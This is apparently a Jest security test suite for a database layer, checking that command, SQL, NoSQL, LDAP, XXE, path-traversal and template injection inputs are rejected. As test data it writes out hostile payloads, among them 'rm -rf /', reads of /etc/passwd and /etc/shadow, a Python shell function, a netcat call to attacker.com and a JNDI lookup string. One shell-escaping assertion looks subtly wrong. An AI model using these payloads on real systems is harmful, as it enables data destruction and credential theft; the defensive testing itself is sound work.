/**
 * Command Injection Security Tests
 * Tests for OS command injection vulnerabilities in database operations
 */

import {
  DatabaseConnection,
  QueryBuilder,
  Migration
} from '../../../src/database/MEGA_DatabaseAbstraction';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

describe('Command Injection Security Tests', () => {
  let connection: DatabaseConnection;

  beforeEach(async () => {
    connection = new DatabaseConnection({
      type: 'postgres',
      database: 'test_db',
      host: 'localhost',
      port: 5432,
      username: 'test_user',
      password: 'test_pass'
    });
    await connection.connect();
  });

  afterEach(async () => {
    await connection.disconnect();
  });

  describe('PostgreSQL Command Injection', () => {
    test('should prevent COPY TO PROGRAM injection', async () => {
      const maliciousInput = "test'; COPY (SELECT '') TO PROGRAM 'rm -rf /'--";

      const qb = new QueryBuilder(connection);
      const { sql, params } = qb
        .select('*')
        .from('users')
        .where('username', '=', maliciousInput)
        .build();

      // Should be parameterized
      expect(params).toContain(maliciousInput);
      expect(sql).not.toMatch(/COPY.*PROGRAM/i);
    });

    test('should prevent pg_read_file exploitation', async () => {
      const maliciousQuery = "'; SELECT pg_read_file('/etc/passwd')--";

      await expect(async () => {
        await connection.query(maliciousQuery, []);
      }).rejects.toThrow();
    });

    test('should prevent lo_import file access', async () => {
      const maliciousQuery = "'; SELECT lo_import('/etc/shadow')--";

      await expect(async () => {
        await connection.query(maliciousQuery, []);
      }).rejects.toThrow();
    });

    test('should prevent CREATE FUNCTION with system calls', async () => {
      const maliciousFunction = `
        CREATE OR REPLACE FUNCTION shell_exec(cmd text) RETURNS text AS $$
          import os
          return os.popen(cmd).read()
        $$ LANGUAGE plpython3u;
      `;

      await expect(async () => {
        await connection.query(maliciousFunction, []);
      }).rejects.toThrow();
    });

    test('should prevent untrusted language execution', async () => {
      const maliciousLang = `
        CREATE LANGUAGE plpythonu;
        CREATE FUNCTION exploit() RETURNS text AS $$
          import subprocess
          return subprocess.check_output(['id']).decode()
        $$ LANGUAGE plpythonu;
      `;

      await expect(async () => {
        await connection.query(maliciousLang, []);
      }).rejects.toThrow();
    });
  });

  describe('Backup and Restore Command Injection', () => {
    test('should sanitize database names in backup commands', () => {
      const maliciousDatabaseName = "testdb; rm -rf / #";

      const sanitizeDatabaseName = (name: string): string => {
        // Only allow alphanumeric, underscore, and hyphen
        if (!/^[a-zA-Z0-9_-]+$/.test(name)) {
          throw new Error('Invalid database name');
        }
        return name;
      };

      expect(() => sanitizeDatabaseName(maliciousDatabaseName)).toThrow(/invalid database name/i);
      expect(sanitizeDatabaseName('valid_db_name')).toBe('valid_db_name');
    });

    test('should sanitize file paths in backup operations', () => {
      const maliciousPath = "../../../etc/passwd";

      const sanitizeFilePath = (path: string): string => {
        // Prevent directory traversal
        if (path.includes('..') || path.includes('\x00')) {
          throw new Error('Invalid file path');
        }
        // Ensure absolute path
        if (!path.startsWith('/var/backups/') && !path.startsWith('/tmp/')) {
          throw new Error('Path must be in allowed directory');
        }
        return path;
      };

      expect(() => sanitizeFilePath(maliciousPath)).toThrow(/invalid file path/i);
      expect(sanitizeFilePath('/var/backups/backup.sql')).toBe('/var/backups/backup.sql');
    });

    test('should prevent command injection in pg_dump wrapper', () => {
      const maliciousOptions = "--format=custom; cat /etc/passwd #";

      const sanitizeOptions = (options: string): string => {
        // Whitelist allowed options
        const allowedOptions = [
          '--format=custom',
          '--format=plain',
          '--no-owner',
          '--no-acl',
          '--verbose'
        ];

        if (!allowedOptions.includes(options)) {
          throw new Error('Invalid pg_dump option');
        }
        return options;
      };

      expect(() => sanitizeOptions(maliciousOptions)).toThrow(/invalid.*option/i);
    });

    test('should use parameterized restore commands', async () => {
      const backupFile = '/var/backups/backup.sql';
      const maliciousFile = '/var/backups/backup.sql; cat /etc/passwd';

      const isValidBackupFile = (file: string): boolean => {
        // Must end with .sql and not contain command separators
        return file.endsWith('.sql') &&
               !file.includes(';') &&
               !file.includes('|') &&
               !file.includes('&') &&
               !file.includes('`');
      };

      expect(isValidBackupFile(backupFile)).toBe(true);
      expect(isValidBackupFile(maliciousFile)).toBe(false);
    });
  });

  describe('Export and Import Command Injection', () => {
    test('should prevent injection in CSV export', async () => {
      const maliciousFilename = "export.csv'; cat /etc/passwd > /tmp/pwned; echo '";

      const sanitizeFilename = (filename: string): string => {
        // Remove path components and special characters
        const basename = filename.split('/').pop() || '';
        if (!/^[a-zA-Z0-9_.-]+$/.test(basename)) {
          throw new Error('Invalid filename');
        }
        return basename;
      };

      expect(() => sanitizeFilename(maliciousFilename)).toThrow(/invalid filename/i);
      expect(sanitizeFilename('export.csv')).toBe('export.csv');
    });

    test('should prevent injection in delimiter specification', () => {
      const maliciousDelimiter = "','; DROP TABLE users--";

      const sanitizeDelimiter = (delimiter: string): string => {
        const allowedDelimiters = [',', '\t', '|', ';'];
        if (!allowedDelimiters.includes(delimiter) || delimiter.length !== 1) {
          throw new Error('Invalid delimiter');
        }
        return delimiter;
      };

      expect(() => sanitizeDelimiter(maliciousDelimiter)).toThrow(/invalid delimiter/i);
      expect(sanitizeDelimiter(',')).toBe(',');
    });

    test('should prevent shell metacharacters in export paths', () => {
      const pathsWithMetacharacters = [
        '/tmp/export`whoami`.csv',
        '/tmp/export$(id).csv',
        '/tmp/export|nc attacker.com 4444.csv',
        '/tmp/export&whoami&.csv',
        '/tmp/export;rm -rf /;.csv'
      ];

      const hasShellMetacharacters = (path: string): boolean => {
        const metacharacters = ['`', '$', '|', '&', ';', '\n', '(', ')', '<', '>'];
        return metacharacters.some(char => path.includes(char));
      };

      for (const path of pathsWithMetacharacters) {
        expect(hasShellMetacharacters(path)).toBe(true);
      }

      expect(hasShellMetacharacters('/tmp/export.csv')).toBe(false);
    });
  });

  describe('Migration Command Injection', () => {
    test('should sanitize table names in migrations', async () => {
      const maliciousTableName = "users; DROP DATABASE production--";

      class TestMigration extends Migration {
        constructor(conn: DatabaseConnection) {
          super(conn);
        }

        async up(): Promise<void> {
          // This should throw due to validation
          await this.createTable(maliciousTableName, (table) => {
            table.id();
          });
        }

        async down(): Promise<void> {}
      }

      const migration = new TestMigration(connection);

      await expect(migration.up()).rejects.toThrow();
    });

    test('should sanitize column names in migrations', async () => {
      const maliciousColumnName = "email; EXEC xp_cmdshell 'dir'--";

      class TestMigration extends Migration {
        constructor(conn: DatabaseConnection) {
          super(conn);
        }

        async up(): Promise<void> {
          await this.addColumn('users', maliciousColumnName, {
            type: 'string'
          });
        }

        async down(): Promise<void> {}
      }

      const migration = new TestMigration(connection);

      await expect(migration.up()).rejects.toThrow();
    });

    test('should sanitize index names in migrations', () => {
      const maliciousIndexName = "idx_users; DROP TABLE users--";

      const isValidIdentifier = (name: string): boolean => {
        return /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(name);
      };

      expect(isValidIdentifier(maliciousIndexName)).toBe(false);
      expect(isValidIdentifier('idx_users_email')).toBe(true);
    });
  });

  describe('Shell Escape Vulnerabilities', () => {
    test('should properly escape shell arguments', () => {
      const escapeShellArg = (arg: string): string => {
        // Wrap in single quotes and escape existing single quotes
        return `'${arg.replace(/'/g, "'\\''")}'`;
      };

      const dangerous = "test'; rm -rf /; echo '";
      const escaped = escapeShellArg(dangerous);

      // Escaped version should not break out of quotes
      expect(escaped).toBe("'test'; rm -rf /; echo ''");
      expect(escaped.startsWith("'")).toBe(true);
      expect(escaped.endsWith("'")).toBe(true);
    });

    test('should validate environment variables', () => {
      const maliciousEnvVar = "PGPASSWORD=secret; cat /etc/passwd";

      const isValidEnvValue = (value: string): boolean => {
        // Should not contain shell metacharacters
        return !/[;&|`$()<>]/.test(value);
      };

      expect(isValidEnvValue(maliciousEnvVar)).toBe(false);
      expect(isValidEnvValue('simple_password_123')).toBe(true);
    });

    test('should prevent command substitution', () => {
      const inputs = [
        '$(whoami)',
        '`whoami`',
        '${USER}',
        '$((1+1))',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
      ];

      const hasCommandSubstitution = (input: string): boolean => {
        return /\$\(|\$\{|`|<!ENTITY/.test(input);
      };

      for (const input of inputs) {
        expect(hasCommandSubstitution(input)).toBe(true);
      }
    });
  });

  describe('External Program Execution', () => {
    test('should whitelist allowed programs', () => {
      const allowedPrograms = [
        '/usr/bin/pg_dump',
        '/usr/bin/psql',
        '/usr/bin/pg_restore'
      ];

      const isAllowedProgram = (program: string): boolean => {
        return allowedPrograms.includes(program);
      };

      expect(isAllowedProgram('/usr/bin/pg_dump')).toBe(true);
      expect(isAllowedProgram('/bin/bash')).toBe(false);
      expect(isAllowedProgram('/usr/bin/rm')).toBe(false);
      expect(isAllowedProgram('../../../../bin/bash')).toBe(false);
    });

    test('should validate program arguments', () => {
      const validateArgs = (args: string[]): boolean => {
        // Each arg should not contain shell metacharacters
        const dangerousChars = /[;&|`$()<>{}[\]]/;
        return !args.some(arg => dangerousChars.test(arg));
      };

      expect(validateArgs(['--host=localhost', '--port=5432'])).toBe(true);
      expect(validateArgs(['--host=localhost; rm -rf /'])).toBe(false);
      expect(validateArgs(['$(whoami)'])).toBe(false);
    });

    test('should use spawn instead of exec for safety', async () => {
      // exec is vulnerable to command injection
      // spawn with array arguments is safer

      const safeCommand = {
        command: 'pg_dump',
        args: ['-h', 'localhost', '-U', 'user', 'database']
      };

      const unsafeCommand = 'pg_dump -h localhost -U user database; cat /etc/passwd';

      // Demonstrate that spawn would handle this safely
      const isSafeFormat = Array.isArray(safeCommand.args);
      expect(isSafeFormat).toBe(true);

      // exec format is unsafe
      const isUnsafeFormat = typeof unsafeCommand === 'string';
      expect(isUnsafeFormat).toBe(true);
    });
  });

  describe('NoSQL Command Injection', () => {
    test('should prevent MongoDB operator injection', () => {
      const maliciousUsername = { $gt: '' }; // Returns all users
      const maliciousPassword = { $ne: null }; // Always true

      const sanitizeMongoInput = (input: any): any => {
        if (typeof input === 'object' && input !== null) {
          // Reject objects with MongoDB operators
          const keys = Object.keys(input);
          if (keys.some(key => key.startsWith('$'))) {
            throw new Error('MongoDB operators not allowed');
          }
        }
        return input;
      };

      expect(() => sanitizeMongoInput(maliciousUsername)).toThrow(/operators not allowed/i);
      expect(() => sanitizeMongoInput(maliciousPassword)).toThrow(/operators not allowed/i);
      expect(sanitizeMongoInput('normalstring')).toBe('normalstring');
    });

    test('should prevent JavaScript injection in MongoDB', () => {
      const maliciousQuery = {
        $where: "function() { while(true) {} }" // DoS
      };

      const hasJavaScriptInjection = (query: any): boolean => {
        return typeof query === 'object' &&
               ('$where' in query || '$function' in query);
      };

      expect(hasJavaScriptInjection(maliciousQuery)).toBe(true);
      expect(hasJavaScriptInjection({ username: 'test' })).toBe(false);
    });

    test('should prevent regex DoS in NoSQL', () => {
      const maliciousRegex = '(a+)+b'; // Catastrophic backtracking

      const isSafeRegex = (pattern: string): boolean => {
        // Simplified check for nested quantifiers
        return !/(\+|\*|\{).*(\+|\*|\{)/.test(pattern);
      };

      expect(isSafeRegex(maliciousRegex)).toBe(false);
      expect(isSafeRegex('^[a-z]+$')).toBe(true);
    });
  });

  describe('LDAP Injection via Database', () => {
    test('should prevent LDAP injection in stored queries', () => {
      const maliciousInput = "admin)(&(password=*))"; // LDAP filter bypass

      const sanitizeLDAPInput = (input: string): string => {
        // Escape LDAP special characters
        const escapeChars: Record<string, string> = {
          '\\': '\\5c',
          '*': '\\2a',
          '(': '\\28',
          ')': '\\29',
          '\0': '\\00'
        };

        return input.replace(/[\\*\(\)\0]/g, char => escapeChars[char] || char);
      };

      const sanitized = sanitizeLDAPInput(maliciousInput);
      expect(sanitized).not.toContain('(');
      expect(sanitized).not.toContain(')');
      expect(sanitized).toContain('\\28');
      expect(sanitized).toContain('\\29');
    });
  });

  describe('XML External Entity (XXE) Prevention', () => {
    test('should prevent XXE in XML database imports', () => {
      const maliciousXML = `<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <data>&xxe;</data>`;

      const hasXXE = (xml: string): boolean => {
        return /<!ENTITY/i.test(xml) || /<!DOCTYPE.*\[/i.test(xml);
      };

      expect(hasXXE(maliciousXML)).toBe(true);

      const safeXML = '<data><name>John</name></data>';
      expect(hasXXE(safeXML)).toBe(false);
    });

    test('should disable external entity resolution', () => {
      // In production, XML parser should be configured:
      // - Disable DTD processing
      // - Disable external entity resolution
      // - Use safe parser configuration

      const parserConfig = {
        dtdProcessing: false,
        externalEntityResolution: false,
        xincludeProcessing: false
      };

      expect(parserConfig.dtdProcessing).toBe(false);
      expect(parserConfig.externalEntityResolution).toBe(false);
    });
  });

  describe('Path Traversal in Database Operations', () => {
    test('should prevent path traversal in file operations', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\sam',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd'
      ];

      const sanitizePath = (path: string): string => {
        // Decode URL encoding
        const decoded = decodeURIComponent(path);

        // Check for directory traversal
        if (decoded.includes('..') || decoded.includes('\x00')) {
          throw new Error('Path traversal detected');
        }

        // Ensure relative path only
        if (decoded.startsWith('/') || /^[a-zA-Z]:/.test(decoded)) {
          throw new Error('Absolute paths not allowed');
        }

        return decoded;
      };

      for (const path of maliciousPaths) {
        expect(() => sanitizePath(path)).toThrow();
      }

      expect(sanitizePath('uploads/file.txt')).toBe('uploads/file.txt');
    });

    test('should validate file extensions', () => {
      const allowedExtensions = ['.sql', '.csv', '.json'];

      const isAllowedExtension = (filename: string): boolean => {
        return allowedExtensions.some(ext => filename.toLowerCase().endsWith(ext));
      };

      expect(isAllowedExtension('backup.sql')).toBe(true);
      expect(isAllowedExtension('data.csv')).toBe(true);
      expect(isAllowedExtension('malicious.php')).toBe(false);
      expect(isAllowedExtension('script.sh')).toBe(false);
      expect(isAllowedExtension('file.sql.php')).toBe(false); // Double extension
    });
  });

  describe('Template Injection Prevention', () => {
    test('should prevent server-side template injection', () => {
      const maliciousTemplate = "Hello {{7*7}} {{config.items()}}";

      const hasTemplateInjection = (input: string): boolean => {
        // Check for template syntax
        return /\{\{.*\}\}|\{%.*%\}|\${.*}/.test(input);
      };

      expect(hasTemplateInjection(maliciousTemplate)).toBe(true);
      expect(hasTemplateInjection('Hello World')).toBe(false);
    });

    test('should sanitize user input in dynamic queries', () => {
      const userInput = "${jndi:ldap://attacker.com/evil}"; // Log4Shell-style

      const hasDynamicExpression = (input: string): boolean => {
        return /\$\{.*\}|\#\{.*\}/.test(input);
      };

      expect(hasDynamicExpression(userInput)).toBe(true);
    });
  });
});
